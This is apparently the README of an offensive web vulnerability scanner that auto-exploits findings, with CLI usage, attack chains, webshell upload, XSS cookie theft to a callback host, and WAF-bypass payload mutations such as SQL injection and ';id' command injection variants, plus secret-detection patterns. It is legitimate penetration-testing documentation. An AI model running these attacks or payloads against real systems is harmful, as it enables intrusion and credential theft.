# LANTERN

```
 ██▓    ▄▄▄       ███▄    █ ▄▄▄█████▓▓█████  ██▀███   ███▄    █ 
▓██▒   ▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ 
▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒
░██████▒▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██░   ▓██░
░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░
  ░ ░    ░   ▒      ░   ░ ░   ░         ░     ░░   ░    ░   ░ ░ 
    ░  ░     ░  ░         ░             ░  ░   ░              ░ 
```

Web vulnerability scanner with automatic exploitation. 55 modules, async architecture, attack chains, and actual data extraction.

## Features

- **55 scanner modules** covering injection, auth, API, recon, and business logic
- **Auto-exploitation** - doesn't just find vulns, extracts data (credentials, files, cloud keys)
- **Attack chains** - automatically pivots from one finding to the next
- **Smart shell construction** - builds and uploads optimized webshells for RCE
- **Cookie theft via XSS** - real exfiltration to your callback server
- **JWT forging** - cracks secrets and forges admin tokens
- **Cloud metadata extraction** - AWS keys, GCP tokens via SSRF
- **High-speed DNS brute force** - 500+ req/s async subdomain discovery, no external tools
- **Technology detection** - 100+ fingerprints, auto-selects relevant modules
- **Regex mutation engine** - 200+ pattern-based payload transformations for WAF bypass
- **Obfuscation engine** - 34 techniques across 6 categories (encoding, case, whitespace, comments, concat, splitting)
- **Secret extraction** - automatically pulls API keys, JWTs, passwords, AWS keys from responses
- **Learned payloads** - successful mutations are saved and reused, arsenal grows with each scan
- **WAF detection** - 22 signatures (Cloudflare, Akamai, Imperva, etc.) with adaptive bypass
- **Subdomain takeover** - 55 service fingerprints for dangling DNS detection
- **Cloud misconfiguration** - S3, Azure Blob, GCP Storage, Firebase exposure scanning
- **HTTP/2 smuggling** - H2.CL, H2.TE desync, request tunneling attacks
- **Cache poisoning** - unkeyed headers/params, path normalization, web cache deception
- **CSP bypass analysis** - CDN bypasses, JSONP detection, Angular exploitation
- **Parameter discovery** - 308 common params, header fuzzing, JS/HTML extraction
- **Reports** - HTML, JSON, Markdown, JIRA CSV with CVSS scores
- **CI/CD integration** - Exit codes, SARIF for GitHub/GitLab, JUnit XML for Jenkins
- **Scope management** - Include/exclude domains, IPs, regex patterns, file-based config
- **Response caching** - LRU cache with TTL, persistence, improves scan speed

## Install

### pipx (recommended)
```bash
pipx install git+https://github.com/Suffix30/LANTERNv2.0.git
```

### pip
```bash
pip install git+https://github.com/Suffix30/LANTERNv2.0.git
```

### From source
```bash
git clone https://github.com/Suffix30/LANTERNv2.0.git
cd LANTERNv2.0
pip install -e .
```

Python 3.10+ required.

## Quick Start

```bash
lantern -t https://target.com -o report

lantern -t https://target.com --crawl --deep

lantern -t https://target.com -m sqli,xss,ssrf --aggressive

lantern -t https://target.com --fast
```

## Command Reference

For comprehensive command examples, module combinations, obfuscation techniques, and advanced usage patterns, see the [Commands Expanded Guide](docs/Commands-Expanded.md).

This guide includes:
- Strategic module combinations for different testing scenarios
- Obfuscation and WAF bypass techniques
- Advanced command patterns and creative combinations
- Complete module reference with common combinations
- Quick reference for essential patterns

## Subdomain Brute Force

High-speed async DNS brute force without external tools:

```bash
lantern -t https://target.com --dns-brute

lantern -t https://target.com --dns-brute --dns-concurrency 1000

lantern -t https://target.com --dns-brute --dns-wordlist /path/to/wordlist.txt
```

Features:
- 500+ requests/second using raw UDP sockets
- Automatic wildcard detection and filtering
- Resolver pooling across 14 DNS servers
- Smart retry with server failover
- No external tools required (no massdns)

## Technology Detection

Fingerprint the tech stack and auto-select modules:

```bash
lantern -t https://target.com --tech-detect

lantern -t https://target.com --smart

lantern -t https://target.com --smart --exploit
```

The `--smart` flag detects technologies (WordPress, Django, Spring, etc.) and automatically adds relevant modules (sqli, ssti, deserial) to the scan.

Detection covers:
- Response headers (Server, X-Powered-By)
- Cookies (PHPSESSID, JSESSIONID, etc.)
- HTML patterns (meta generators, framework fingerprints)
- URL patterns (/.aspx, /wp-admin, /actuator)

## LDAP / Active Directory

Test for LDAP injection and enumerate AD environments:

```bash
lantern -t https://target.com -m ldap

lantern -t https://target.com -m ldap --exploit

lantern -t https://target.com --chain auth_bypass
```

Capabilities:
- LDAP filter injection (`*`, `)(`, `%00`)
- Authentication bypass testing
- Blind LDAP injection (response length diff)
- User enumeration via timing/error
- AD attribute exposure detection
- sAMAccountName, memberOf, objectSid extraction

## Directory Brute Force

Aggressive path and file discovery:

```bash
lantern -t https://target.com -m dirbust

lantern -t https://target.com -m dirbust --aggressive

lantern -t https://target.com --chain enum
```

Features:
- 100+ common directories (admin, api, backup, config, etc.)
- 80+ sensitive files (.env, .git, backups, configs)
- Backup pattern detection (domain.zip, database.sql)
- Recursive subdirectory enumeration
- Smart 404 detection (avoids false positives)
- Source code exposure detection
- Secret extraction from discovered files

## Exploitation Mode

The `--exploit` flag enables automatic exploitation of discovered vulnerabilities:

```bash
lantern -t https://target.com --exploit --deep -o report
```

What exploitation does per module:

| Module | Exploitation |
|--------|-------------|
| SSRF | Extracts AWS/GCP credentials, probes internal services |
| LFI | Reads /etc/passwd, .env, config files, SSH keys |
| SQLi | Dumps database version, tables, credentials |
| CMDI | Executes commands, reads files, extracts env vars |
| SSTI | RCE via template engine, extracts system info |
| XXE | Exfiltrates files, accesses cloud metadata |
| JWT | Forges admin tokens, accesses protected endpoints |
| Upload | Constructs shells (PHP/ASP/JSP), uploads, verifies RCE |
| XSS | Cookie theft, keylogging, phishing injection |
| LDAP | Auth bypass, user enumeration, AD attribute extraction |
| Dirbust | Backup discovery, source code exposure, secret extraction |

For XSS cookie capture, provide a callback server:

```bash
lantern -t https://target.com --exploit -m xss --callback-host your-server.com
```

## Attack Chains

Chain modules together to pivot from one finding to another:

```bash
lantern -t https://target.com --chain data_theft
lantern -t https://target.com --chain rce
lantern -t https://target.com --chain auth_bypass
lantern -t https://target.com --chain api_attack
lantern -t https://target.com --chain enum
```

| Chain | Modules |
|-------|---------|
| auth_bypass | waf, sqli, ldap, auth, jwt, oauth, mfa, session |
| data_theft | waf, sqli, ssrf, lfi, xxe, idor, disclosure, dirbust, cloud |
| rce | waf, cmdi, ssti, deserial, upload, ssrf |
| xss_chain | waf, csp, xss, dom, prototype, cors, csrf |
| api_attack | waf, api, graphql, massassign, jwt, idor |
| enum | waf, dirbust, subdomain, takeover, disclosure, fingerprint, techdetect, dork, cloud |
| injection | waf, paramfind, sqli, xss, ssti, cmdi, lfi, xxe, crlf |
| smuggle | waf, h2smuggle, smuggle, cachepois |
| cache | cachepois, headers, cors |
| cloud | cloud, ssrf, disclosure, dirbust |
| takeover | takeover, subdomain |
| full_recon | waf, techdetect, fingerprint, subdomain, takeover, cloud, dirbust, disclosure, dork, paramfind, csp |

Chains automatically use exploitation data - if SSRF extracts AWS keys, the chain logs the attack path and suggests next steps.

List chains: `lantern --list-chains`

## Modules

**Injection:** sqli, xss, cmdi, ssti, xxe, lfi, crlf, hpp, ldap, fuzz, deserial, smuggle, h2smuggle

**Auth/Access:** auth, jwt, oauth, mfa, session, cookie, csrf, idor, massassign, cors, redirect, clickjack, upload

**API:** api, graphql, websocket, apiver

**Recon:** fingerprint, disclosure, secrets, subdomain, techdetect, dork, cve, dirbust, paramfind, takeover, cloud, waf

**Config:** headers, ssl, cache, cachepois, download, ssrf, csp

**Business Logic:** payment, race, captcha, account, prototype, dom

**55 modules total.** List all: `lantern --list`

## Presets

```bash
lantern -t https://target.com --preset fast
lantern -t https://target.com --preset api
lantern -t https://target.com --preset stealth
lantern -t https://target.com --preset thorough
lantern -t https://target.com --preset exploit
```

List presets: `lantern --list-presets`

## Reports

```bash
lantern -t https://target.com -o report                  # HTML
lantern -t https://target.com -o report --format json    # JSON
lantern -t https://target.com -o report --format all     # All formats
```

Reports include:
- Executive summary with risk rating
- CVSS scores per finding
- Remediation steps with code examples
- Exploitation data (extracted creds, files, shell URLs)

## Options

```
-t, --target        Target URL or file with URLs
-m, --modules       Comma-separated module list
-o, --output        Output filename (no extension)
--format            html, json, md, jira, all
--threads           Concurrent requests (default: 50)
--timeout           Request timeout seconds (default: 10)
--crawl             Enable crawler
--crawl-depth       How deep to crawl (default: 3)
--aggressive        More payloads, WAF bypass attempts
--stealth           Slower, randomized timing
--fast              Passive checks only
--deep              Thorough injection testing
--exploit           Enable auto-exploitation
--callback-host     Your server for OOB/XSS callbacks
--preset            Use a preset config
--chain             Run attack chain
--smart             Smart module selection based on tech detection
--tech-detect       Run technology detection only
--dns-brute         High-speed DNS subdomain brute force
--dns-wordlist      Custom wordlist for DNS brute force
--dns-concurrency   DNS brute force concurrency (default: 500)
--proxy             Proxy URL (http://127.0.0.1:8080)
--resume            Resume from checkpoint
-H, --header        Custom header (repeatable)
-c, --cookies       Cookie string
-v, --verbose       Verbose output
--ci                CI/CD mode with exit codes
--fail-on           Fail on severity (CRITICAL, HIGH, MEDIUM, LOW)
--sarif             Output SARIF report for GitHub/GitLab
--junit             Output JUnit XML for CI pipelines
--scope-file        Load scope from file
--include-domain    Include domain in scope (repeatable)
--exclude-domain    Exclude domain from scope (repeatable)
--exclude-pattern   Exclude URL pattern regex (repeatable)
--cache             Enable response caching
--cache-ttl         Cache TTL in seconds (default: 300)
```

## CI/CD Integration

Run in CI pipelines with proper exit codes and standardized reports:

```bash
lantern -t https://target.com --ci --fail-on HIGH -o scan_results

lantern -t https://target.com --ci --sarif results.sarif

lantern -t https://target.com --ci --junit results.xml
```

**Exit codes:**
- `0` - No vulnerabilities above threshold
- `1` - Vulnerabilities found at or above fail-on severity
- `2` - Vulnerability count threshold exceeded
- `3` - Scan error
- `4` - Configuration error

**GitHub Actions example:**
```yaml
- name: Security Scan
  run: |
    lantern -t ${{ env.TARGET }} --ci --sarif results.sarif --fail-on HIGH
- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

## Scope Management

Control what gets scanned:

```bash
lantern -t https://target.com --include-domain target.com --include-domain api.target.com

lantern -t urls.txt --exclude-domain logout.target.com --exclude-pattern "/static/"

lantern -t https://target.com --scope-file scope.txt
```

**Scope file format:**
```
+target.com
+*.target.com
-logout.target.com
-regex:/logout|/signout/
-path:/static/
+ip:10.0.0.0/8
```

## Mutation Engine

Lantern automatically mutates payloads using regex patterns to bypass WAFs:

**SQLi mutations:**
- `' OR 1=1--` → `'/**/OR/**/1=1--`, `' || 1=1--`, `'%09OR%091=1--`
- Case mixing, inline comments, whitespace encoding, quote variants

**XSS mutations:**
- `<script>` → `%3Cscript>`, `<ScRiPt>`, `<svg/onload=`
- Unicode escapes, null bytes, tag substitution

**Command injection:**
- `;id` → `%0aid`, `&&id`, `${IFS}id`
- Separator variants, IFS bypass, quoting

All 6 categories (sqli, xss, cmdi, lfi, ssti, ssrf) have dedicated mutation patterns.

## Obfuscation Engine

Advanced payload obfuscation for WAF bypass:

| Category | Techniques | Examples |
|----------|------------|----------|
| **Encoding** | URL, double/triple URL, unicode, hex, octal, HTML entities, overlong UTF-8, UTF-7/16 | `<` → `%3C`, `%253C`, `\u003c`, `&#60;` |
| **Case** | Random, alternating, inverse | `SCRIPT` → `ScRiPt`, `sCrIpT` |
| **Whitespace** | Tab, newline, null byte, zero-width chars | `' OR` → `'\tOR`, `'\x00OR` |
| **Comments** | SQL inline, multiline, version | `SELECT` → `SEL/**/ECT`, `/*!50000SELECT*/` |
| **Concatenation** | String concat, CHAR(), fromCharCode | `admin` → `'ad'+'min'`, `CHAR(97,100,109,105,110)` |
| **Splitting** | Keyword split, reverse, chunk | `alert` → `al"+"ert` |

**Polyglot payloads** included for testing multiple contexts at once.

## Secret Extraction

Responses are automatically scanned for secrets:

| Pattern | Detected |
|---------|----------|
| `AKIA...` | AWS Access Keys |
| `eyJ...` | JWT Tokens |
| `password=...` | Credentials |
| `api_key=...` | API Keys |
| `192.168.x.x` | Internal IPs |
| `-----BEGIN RSA PRIVATE KEY-----` | SSH Keys |
| MD5/SHA1/SHA256 hashes | Password hashes |

Extracted secrets appear in findings with `exploit_data`.

## Learned Payloads

Successful payloads are automatically saved:

```
payloads/
├── sqli.txt           # Base payloads
├── xss.txt
├── learned/           # Auto-generated
│   ├── index.json     # Payload metadata
│   ├── sqli.txt       # Learned SQLi
│   └── xss.txt        # Learned XSS
```

On future scans, learned payloads are tested first. The arsenal grows with each successful exploitation.

## Adding Payloads

Drop payload files in `payloads/` directory:

```
payloads/
├── sqli.txt
├── xss.txt
├── lfi.txt
├── ssrf.txt
├── cmdi.txt
└── your_custom.txt
```

One payload per line. Modules will pick them up automatically.

## Test Targets

Legal targets for testing:

```
http://testphp.vulnweb.com
http://testhtml5.vulnweb.com
http://testasp.vulnweb.com
https://demo.testfire.net
http://zero.webappsecurity.com
```

Self-hosted:
```bash
docker run -p 80:80 vulnerables/web-dvwa
docker run -p 3000:3000 bkimminich/juice-shop
docker run -p 8080:8080 webgoat/webgoat
```

## Project Structure

```
lantern/
├── lantern              # Entry point
├── requirements.txt
├── pyproject.toml       # pipx/pip install config
├── core/
│   ├── engine.py        # Scan orchestration
│   ├── http.py          # Async HTTP client
│   ├── crawler.py       # Web crawler
│   ├── reporter.py      # Report generation
│   ├── bypass.py        # WAF bypass + regex mutation engine
│   ├── learned.py       # Payload learning system
│   ├── dns_brute.py     # Async DNS brute forcer
│   ├── tech_detect.py   # Technology fingerprinting
│   └── cli.py           # Command-line interface
├── modules/             # 45 scanner modules
├── payloads/            # Attack payloads (add your own)
│   └── learned/         # Auto-generated successful payloads
└── presets/             # Scan profiles (YAML)
```

## Legal

For authorized testing only. You are responsible for how you use this tool.

## Author

NET

## License

MIT
